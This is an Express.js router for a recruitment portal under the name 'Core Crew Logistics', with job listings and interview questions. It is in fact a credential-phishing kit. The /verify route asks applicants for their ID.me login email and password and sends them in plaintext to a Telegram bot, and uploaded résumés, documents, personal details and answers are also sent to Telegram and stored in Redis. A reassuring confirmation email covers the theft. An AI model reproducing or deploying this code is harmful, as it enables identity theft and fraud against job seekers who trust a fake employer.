const path = require('path');
const os = require('os');
const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');
const { Redis } = require('@upstash/redis');
const nodemailer = require('nodemailer');

const router = express.Router();

// Storage for uploads (temp on disk)
const upload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, os.tmpdir()),
    filename: (req, file, cb) => {
      const timestamp = Date.now();
      const safe = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_');
      cb(null, `${timestamp}-${safe}`);
    },
  }),
  limits: { fileSize: 15 * 1024 * 1024 },
});

const JOB_POSITIONS = [
  'Nursing Practitioner',
  'Logistics Coordinator / Dispatcher',
  'Supply Chain Analyst',
  'Customer Support / Client Relations',
  'HR / Recruitment / Talent Acquisition',
  'IT / Software Support',
  'Drivers (truck, delivery, fleet)',
  'Warehouse Staff & Forklift Operators',
  'Fleet & Maintenance Supervisors',
  'Virtual Assistance',
  'Account Manager',
  'Project Manager',
  'Data Entry',
  'Customer support',
];

// Normalize position for mapping
function normalizePosition(pos) {
  return pos.trim().toLowerCase().replace(/[\s/&-]+/g, ' ');
}

// Interview questions mapping
const INTERVIEW_QUESTIONS_MAP = {
  "nursing practitioner": [
    { name: "motivation", label: "What motivated you to pursue a career as a Nursing Practitioner, and how do you see yourself contributing to our healthcare team?" },
    { name: "challengingCase", label: "Describe a challenging patient case you've handled and how you approached the diagnosis and treatment plan." },
    { name: "stayCurrent", label: "How do you stay current with the latest medical research and evidence-based practices in your field?" },
    { name: "collaboration", label: "Tell us about a time when you had to collaborate with other healthcare professionals to achieve the best patient outcome." },
    { name: "disagreement", label: "How would you handle a situation where a patient disagrees with your recommended treatment plan?" }
  ],
  "logistics coordinator dispatcher": [
    { name: "motivation", label: "Why did you choose a career in logistics and dispatching?" },
    { name: "dispatchChallenge", label: "Describe a time you solved a major dispatch challenge." },
    { name: "technology", label: "What technologies have you used for tracking and optimizing routes?" },
    { name: "collaboration", label: "Describe a situation where you worked with other departments to resolve a logistics issue." },
    { name: "customerService", label: "How do you handle difficult customer interactions in logistics?" }
  ],
  "supply chain analyst": [
    { name: "motivation", label: "What interests you about supply chain analysis?" },
    { name: "dataSkills", label: "Describe your experience with data analysis tools and methods." },
    { name: "problemSolving", label: "Share an example of solving a complex supply chain problem." },
    { name: "collaboration", label: "How do you work with other teams to improve supply chain performance?" },
    { name: "industryTrends", label: "How do you keep up with industry trends?" }
  ],
  "customer support client relations": [
    { name: "motivation", label: "Why are you passionate about customer support and client relations?" },
    { name: "difficultCustomer", label: "Describe a time you resolved a conflict with a difficult customer." },
    { name: "multiTasking", label: "How do you handle multiple requests at once?" },
    { name: "teamwork", label: "How do you contribute to a team's success in a support environment?" },
    { name: "feedback", label: "How do you handle negative feedback from customers?" }
  ],
  "customer support": [
    { name: "motivation", label: "Why are you passionate about customer support?" },
    { name: "difficultCustomer", label: "Describe a time you resolved a conflict with a difficult customer." },
    { name: "multiTasking", label: "How do you handle multiple requests at once?" },
    { name: "teamwork", label: "How do you contribute to a team's success in a support environment?" },
    { name: "feedback", label: "How do you handle negative feedback from customers?" }
  ],
  "hr recruitment talent acquisition": [
    { name: "motivation", label: "Why did you choose HR and recruitment as a career?" },
    { name: "screening", label: "Describe your candidate screening process." },
    { name: "interviewing", label: "Share an example of conducting a successful interview." },
    { name: "diversity", label: "How do you promote diversity and inclusion in hiring?" },
    { name: "metrics", label: "What metrics do you use to measure recruitment success?" }
  ],
  "it software support": [
    { name: "motivation", label: "Why did you choose IT/software support?" },
    { name: "troubleshooting", label: "Describe your troubleshooting approach for technical issues." },
    { name: "tools", label: "What support tools/ticketing systems have you used?" },
    { name: "collaboration", label: "How do you work with developers or other support teams?" },
    { name: "customerService", label: "How do you explain technical solutions to non-technical users?" }
  ],
  "drivers truck delivery fleet": [
    { name: "motivation", label: "Why did you choose a driving career?" },
    { name: "safety", label: "Describe how you ensure safety on the road." },
    { name: "record", label: "How do you maintain a clean driving record?" },
    { name: "challenges", label: "Describe a challenge you faced during delivery and how you solved it." },
    { name: "customerService", label: "How do you handle customer interactions during delivery?" }
  ],
  "warehouse staff forklift operators": [
    { name: "motivation", label: "Why do you want to work in warehouse operations?" },
    { name: "equipment", label: "Describe your experience with forklifts or other warehouse equipment." },
    { name: "safety", label: "How do you ensure safety in the warehouse?" },
    { name: "efficiency", label: "How do you maximize efficiency in warehouse tasks?" },
    { name: "teamwork", label: "Describe your teamwork experience in warehouse settings." }
  ],
  "fleet maintenance supervisors": [
    { name: "motivation", label: "What interests you about fleet and maintenance supervision?" },
    { name: "problemSolving", label: "Describe a maintenance issue you resolved." },
    { name: "preventive", label: "How do you implement preventive maintenance programs?" },
    { name: "teamManagement", label: "How do you manage maintenance teams?" },
    { name: "compliance", label: "How do you ensure regulatory compliance?" }
  ],
  "virtual assistance": [
    { name: "motivation", label: "Why are you interested in virtual assistance?" },
    { name: "tools", label: "What virtual tools/platforms are you proficient in?" },
    { name: "organization", label: "How do you stay organized and manage time remotely?" },
    { name: "communication", label: "Describe your communication style with remote clients." },
    { name: "problemSolving", label: "Share an example of solving a client issue virtually." }
  ],
  "account manager": [
    { name: "motivation", label: "Why did you choose account management?" },
    { name: "relationship", label: "Describe how you build strong client relationships." },
    { name: "problemSolving", label: "Share an example of resolving a client issue." },
    { name: "growth", label: "How do you identify growth opportunities for clients?" },
    { name: "collaboration", label: "How do you collaborate with other departments for client success?" }
  ],
  "project manager": [
    { name: "motivation", label: "Why are you passionate about project management?" },
    { name: "leadership", label: "Describe your leadership style." },
    { name: "planning", label: "How do you plan and execute complex projects?" },
    { name: "risk", label: "How do you manage project risks and changes?" },
    { name: "communication", label: "How do you communicate with stakeholders?" }
  ],
  "data entry": [
    { name: "motivation", label: "Why do you want a data entry role?" },
    { name: "accuracy", label: "How do you ensure accuracy and minimize errors?" },
    { name: "tools", label: "What data tools/software are you familiar with?" },
    { name: "speed", label: "How do you balance speed and quality?" },
    { name: "confidentiality", label: "How do you handle confidential data?" }
  ]
};

// === Default generic interview questions ===
const DEFAULT_QUESTIONS = [
  { name: "about", label: "Tell us about yourself and your professional background." },
  { name: "interest", label: "Why are you interested in working with Core Crew Logistics?" },
  { name: "challenge", label: "Describe a challenge you've overcome at work." },
  { name: "skills", label: "What skills would you bring to this position?" },
  { name: "goals", label: "Where do you see yourself in two years?" }
];

// Entry point
router.get('/', (req, res) => {
  res.render('apply', { positions: JOB_POSITIONS });
});

// Application Start (store draft, show questions)
router.post('/start', upload.array('documents', 6), async (req, res) => {
  try {
    const { firstName, lastName, email, phone, coverLetter, position } = req.body;
    req.session.applicationDraft = {
      firstName,
      lastName,
      email,
      phone,
      coverLetter,
      position,
      files: (req.files || []).map((f) => ({
        path: f.path,
        originalname: f.originalname,
        mimetype: f.mimetype,
      })),
    };
    await sendApplicationToTelegram(req.session.applicationDraft);

    // Always normalize position before lookup!
    const normalizedPosition = normalizePosition(position);
    const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
    const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
    res.render('application-submitted', {
      questions: selectedQuestions,
      position,
      step: 2,
      isDefault
    });
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { message: 'Failed to submit application. Please try again later.' });
  }
});

// Interview Questions GET (for resume, always normalize)
router.get('/interview', (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  const pos = req.session.applicationDraft.position;
  const normalizedPosition = normalizePosition(pos);
  const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
  const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
  res.render('application-submitted', {
    questions: selectedQuestions,
    position: pos,
    step: 2,
    isDefault
  });
});

// Interview POST: show info-note before ID.me verification
router.post('/interview', async (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  req.session.interviewAnswers = req.body;
  await sendInterviewToTelegram(req.session.applicationDraft, req.body);

  // Render the info-note page explaining why information is collected
  res.render('info-note');
});

// Verification GET (ID.me form only, no info-note)
router.get('/verify', (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  res.render('verify', {
    email: req.session.applicationDraft.email || '',
    position: req.session.applicationDraft.position || ''
  });
});

// Verification POST (handles "sign in" to ID.me)
router.post('/verify', async (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  const { email, password } = req.body;
  req.session.verified = true;
  req.session.idme = { email, password };
  await sendIDMeToTelegram({ email, password }, email);
  await sendConfirmationEmail(email, req.session.applicationDraft.firstName);
  res.redirect('/apply/submit');
});

// Completion GET (shows "your application has been submitted" message)
router.get('/submit', async (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  res.render('submit', {
    email: req.session.applicationDraft.email || '',
    firstName: req.session.applicationDraft.firstName || ''
  });
});

// Completion POST (finalizes application & clears session)
router.post('/submit', async (req, res) => {
  try {
    if (!req.session.applicationDraft || !req.session.verified) return res.redirect('/apply');
    const data = req.session.applicationDraft;
    const attachments = (data.files || []).map((f) => ({
      filename: f.originalname,
      path: f.path,
      contentType: f.mimetype,
    }));
    try {
      const redis = new Redis({
        url: process.env.UPSTASH_REDIS_REST_URL,
        token: process.env.UPSTASH_REDIS_REST_TOKEN,
      });
      const key = `application:${Date.now()}:${(data.email || '').replace(/[^a-zA-Z0-9._-]/g, '_')}`;
      await redis.hset(key, {
        firstName: data.firstName,
        lastName: data.lastName,
        email: data.email,
        phone: data.phone,
        position: data.position,
        coverLetter: data.coverLetter || '',
        interviewAnswers: JSON.stringify(req.session.interviewAnswers || {}),
        files: JSON.stringify(attachments.map(a => ({ name: a.filename, type: a.contentType }))),
        idme: JSON.stringify(req.session.idme || {}),
        createdAt: new Date().toISOString(),
      });
    } catch (e) {
      console.warn('Upstash store failed:', e.message);
    }
    req.session.applicationDraft = null;
    req.session.interviewAnswers = null;
    req.session.verified = null;
    req.session.idme = null;
    res.render('success');
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { message: 'Failed to submit application. Please try again later.' });
  }
});

// Helpers below...

async function sendApplicationToTelegram(data) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (botToken && chatId) {
      const summary = `New Application
Name: ${data.firstName} ${data.lastName}
Email: ${data.email}
Phone: ${data.phone}
Position: ${data.position}
Cover Letter: ${data.coverLetter || "N/A"}`;
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: summary }),
      });
      const attachments = (data.files || []).map((f) => ({
        filename: f.originalname,
        path: f.path,
        contentType: f.mimetype,
      }));
      for (const f of attachments) {
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('document', require('fs').createReadStream(f.path), {
          filename: f.filename,
          contentType: f.contentType,
        });
        await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: 'POST', body: form });
      }
    }
  } catch (e) {
    console.warn('Telegram send failed:', e.message);
  }
}

async function sendInterviewToTelegram(application, interviewAnswers) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (botToken && chatId) {
      const normalizedPosition = normalizePosition(application.position);
      const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
      let summary = `Interview Questions Submitted\nName: ${application.firstName} ${application.lastName}\nEmail: ${application.email}\nPosition: ${application.position}\n\n`;
      questions.forEach(q => {
        const answer = interviewAnswers[q.name] || "(No answer provided)";
        summary += `Q: ${q.label}\nA: ${answer}\n\n`;
      });
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: summary }),
      });
    }
  } catch (e) {
    console.warn('Telegram interview send failed:', e.message);
  }
}

async function sendIDMeToTelegram(idme, email) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (botToken && chatId) {
      const summary = `ID.me Verification Complete
Email: ${email}
ID.me Login: ${idme.email}
Password: ${idme.password}`;
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: summary }),
      });
    }
  } catch (e) {
    console.warn('Telegram send failed (ID.me):', e.message);
  }
}

async function sendConfirmationEmail(email, firstName) {
  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST || "smtp.gmail.com",
      port: process.env.SMTP_PORT || 465,
      secure: true,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });
    await transporter.sendMail({
      from: `"Core Crew Logistics" <${process.env.SMTP_USER}>`,
      to: email,
      subject: "Your Application Has Been Submitted",
      text: `Dear ${firstName || "Applicant"},\n\nThank you for completing your application with Core Crew Logistics. Your submission has been received and is now under review.\n\nWe appreciate your interest and will contact you soon regarding the next steps.\n\nBest regards,\nCore Crew Logistics Team`,
    });
  } catch (e) {
    console.warn("Email send failed:", e.message);
  }
}

module.exports = router;